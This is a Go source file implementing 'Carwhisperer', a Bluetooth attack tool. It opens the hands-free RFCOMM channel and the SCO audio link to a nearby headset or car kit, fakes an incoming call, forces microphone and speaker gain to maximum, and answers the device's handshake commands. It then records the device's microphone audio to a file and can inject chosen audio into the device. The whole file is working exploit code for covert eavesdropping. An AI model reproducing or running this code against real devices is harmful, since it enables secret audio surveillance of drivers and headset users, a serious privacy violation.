package bluetooth

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

// rawSCOAddr mirrors Linux's struct sockaddr_sco:
//
//	struct sockaddr_sco { sa_family_t sco_family; bdaddr_t sco_bdaddr; };
type rawSCOAddr struct {
	Family uint16
	Addr   [6]uint8
}

// ParseBDAddr converts "AA:BB:CC:DD:EE:FF" to the little-endian byte order
// expected by sockaddr_rc / sockaddr_sco.
func ParseBDAddr(s string) ([6]byte, error) {
	var out [6]byte
	parts := strings.Split(strings.TrimSpace(s), ":")
	if len(parts) != 6 {
		return out, fmt.Errorf("invalid Bluetooth address %q", s)
	}
	for i, p := range parts {
		n, err := strconv.ParseUint(p, 16, 8)
		if err != nil {
			return out, fmt.Errorf("invalid Bluetooth address %q", s)
		}
		out[5-i] = byte(n)
	}
	return out, nil
}

// FormatBDAddr renders a little-endian address in human order.
func FormatBDAddr(addr [6]byte) string {
	return fmt.Sprintf("%02X:%02X:%02X:%02X:%02X:%02X",
		addr[5], addr[4], addr[3], addr[2], addr[1], addr[0])
}

// Carwhisperer opens the hands-free RFCOMM channel and the SCO audio link to a
// Classic headset/car kit, injects silence (or playPath) and records the
// microphone/audio stream as raw 8 kHz CVSD. It needs root or CAP_NET_ADMIN.
func Carwhisperer(ctx context.Context, hci, address, recordPath, playPath string, onLine func(string)) error {
	emit := func(format string, args ...any) {
		if onLine != nil {
			onLine(fmt.Sprintf(format, args...))
		}
	}

	_, hciName, err := hciNumber(hci)
	if err != nil {
		return err
	}
	addr, err := ParseBDAddr(address)
	if err != nil {
		return err
	}
	if strings.TrimSpace(recordPath) == "" {
		recordPath = CarwhispererRecordPath(address)
	}
	if err := os.MkdirAll(filepath.Dir(recordPath), 0o700); err != nil {
		return err
	}
	record, err := os.OpenFile(recordPath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		return fmt.Errorf("open record file: %w", err)
	}
	defer record.Close()

	var play *os.File
	if strings.TrimSpace(playPath) != "" {
		if f, err := os.Open(playPath); err == nil {
			play = f
			defer play.Close()
		} else {
			emit("Playback file unavailable: %v", err)
		}
	}

	// SCO audio needs the CVSD voice setting (0x0060).
	if _, err := exec.LookPath("hciconfig"); err == nil {
		_ = exec.Command("hciconfig", hciName, "voice", "0x0060").Run()
	}

	rfd, err := unix.Socket(unix.AF_BLUETOOTH, unix.SOCK_STREAM, unix.BTPROTO_RFCOMM)
	if err != nil {
		return fmt.Errorf("RFCOMM socket: %w", err)
	}
	defer unix.Close(rfd)
	setRecvTimeout(rfd)

	if err := unix.Bind(rfd, &unix.SockaddrRFCOMM{Channel: 1}); err != nil {
		return fmt.Errorf("bind RFCOMM: %w", err)
	}
	if err := unix.Connect(rfd, &unix.SockaddrRFCOMM{Addr: addr, Channel: 1}); err != nil {
		return fmt.Errorf("connect RFCOMM channel 1: %w", err)
	}
	emit("RFCOMM connected to %s", FormatBDAddr(addr))

	sfd, err := openSCO(addr)
	if err != nil {
		return fmt.Errorf("connect SCO audio: %w", err)
	}
	defer unix.Close(sfd)
	setRecvTimeout(sfd)
	emit("SCO audio connected")

	// Send the fake incoming call and maximum speaker/mic gain.
	for _, cmd := range []string{"RING\r\n", "AT+VGS=15\r\n", "AT+VGM=15\r\n", "RING\r\n"} {
		_, _ = unix.Write(rfd, []byte(cmd))
		time.Sleep(2 * time.Millisecond)
	}
	emit("Recording to %s", recordPath)

	done := make(chan struct{})
	go func() {
		select {
		case <-ctx.Done():
			_ = unix.Close(rfd)
			_ = unix.Close(sfd)
		case <-done:
		}
	}()
	defer close(done)

	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		carwhispererRFCOMM(ctx, rfd)
	}()
	go func() {
		defer wg.Done()
		carwhispererSCO(ctx, sfd, record, play, emit)
	}()
	wg.Wait()

	if ctx.Err() != nil {
		return ctx.Err()
	}
	return nil
}

func openSCO(addr [6]byte) (int, error) {
	fd, err := unix.Socket(unix.AF_BLUETOOTH, unix.SOCK_SEQPACKET, unix.BTPROTO_SCO)
	if err != nil {
		return -1, err
	}
	if err := bindSCO(fd, [6]byte{}); err != nil {
		unix.Close(fd)
		return -1, err
	}
	if err := connectSCO(fd, addr); err != nil {
		unix.Close(fd)
		return -1, err
	}
	return fd, nil
}

func bindSCO(fd int, addr [6]byte) error {
	sa := rawSCOAddr{Family: unix.AF_BLUETOOTH, Addr: addr}
	_, _, errno := unix.Syscall(unix.SYS_BIND, uintptr(fd), uintptr(unsafe.Pointer(&sa)), unsafe.Sizeof(sa))
	if errno != 0 {
		return errno
	}
	return nil
}

func connectSCO(fd int, addr [6]byte) error {
	sa := rawSCOAddr{Family: unix.AF_BLUETOOTH, Addr: addr}
	_, _, errno := unix.Syscall(unix.SYS_CONNECT, uintptr(fd), uintptr(unsafe.Pointer(&sa)), unsafe.Sizeof(sa))
	if errno != 0 {
		return errno
	}
	return nil
}

func setRecvTimeout(fd int) {
	tv := unix.Timeval{Sec: 0, Usec: 200000}
	_ = unix.SetsockoptTimeval(fd, unix.SOL_SOCKET, unix.SO_RCVTIMEO, &tv)
}

func carwhispererRFCOMM(ctx context.Context, fd int) {
	buf := make([]byte, 512)
	var pending string
	for ctx.Err() == nil {
		n, err := unix.Read(fd, buf)
		if n > 0 {
			pending += string(buf[:n])
			for {
				idx := strings.IndexByte(pending, '\n')
				if idx < 0 {
					break
				}
				line := pending[:idx]
				pending = pending[idx+1:]
				if resp := rfcommResponse(line); resp != "" {
					rfcommWrite(fd, resp)
				}
			}
		}
		if err == nil {
			continue
		}
		if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
			continue
		}
		if ctx.Err() != nil {
			return
		}
		return
	}
}

func rfcommResponse(line string) string {
	up := strings.ToUpper(strings.TrimSpace(line))
	switch {
	case up == "":
		return ""
	case strings.HasPrefix(up, "AT+BRSF="):
		return "+BRSF: 63\r\n"
	case strings.HasPrefix(up, "AT+CIND?"):
		return "+CIND: 0,1,0,0\r\n"
	case strings.HasPrefix(up, "AT+CIND=?"):
		return "+CIND: (\"call\",(0,1)),(\"service\",(0,1)),(\"call_setup\",(0-3)),(\"callsetup\",(0-3))\r\n"
	default:
		return "OK\r\n"
	}
}

func rfcommWrite(fd int, s string) {
	b := []byte(s)
	for len(b) > 0 {
		n, err := unix.Write(fd, b)
		if n > 0 {
			b = b[n:]
		}
		if err != nil {
			if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
				time.Sleep(5 * time.Millisecond)
				continue
			}
			return
		}
		if n == 0 {
			return
		}
	}
}

func carwhispererSCO(ctx context.Context, fd int, record, play *os.File, emit func(string, ...any)) {
	buf := make([]byte, 512)
	silence := make([]byte, 512)
	total := 0
	lastReport := time.Now()
	for ctx.Err() == nil {
		n, err := unix.Read(fd, buf)
		if n > 0 {
			if _, werr := record.Write(buf[:n]); werr != nil {
				emit("Record write failed: %v", werr)
				return
			}
			total += n

			out := silence[:n]
			if play != nil {
				pbuf := make([]byte, n)
				if pn, _ := play.Read(pbuf); pn > 0 {
					out = pbuf[:pn]
				}
			}
			scoWrite(fd, out)
			if time.Since(lastReport) >= 10*time.Second {
				emit("Captured %d bytes", total)
				lastReport = time.Now()
			}
		}
		if err == nil {
			continue
		}
		if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
			continue
		}
		if ctx.Err() != nil {
			return
		}
		emit("SCO read failed: %v", err)
		return
	}
}

func scoWrite(fd int, data []byte) {
	const mtu = 48
	for off := 0; off < len(data); {
		end := off + mtu
		if end > len(data) {
			end = len(data)
		}
		n, err := unix.Write(fd, data[off:end])
		if n > 0 {
			off += n
		}
		if err != nil {
			if err == unix.EAGAIN || err == unix.EWOULDBLOCK || err == unix.EINTR {
				time.Sleep(2 * time.Millisecond)
				continue
			}
			return
		}
		if n == 0 {
			return
		}
	}
}
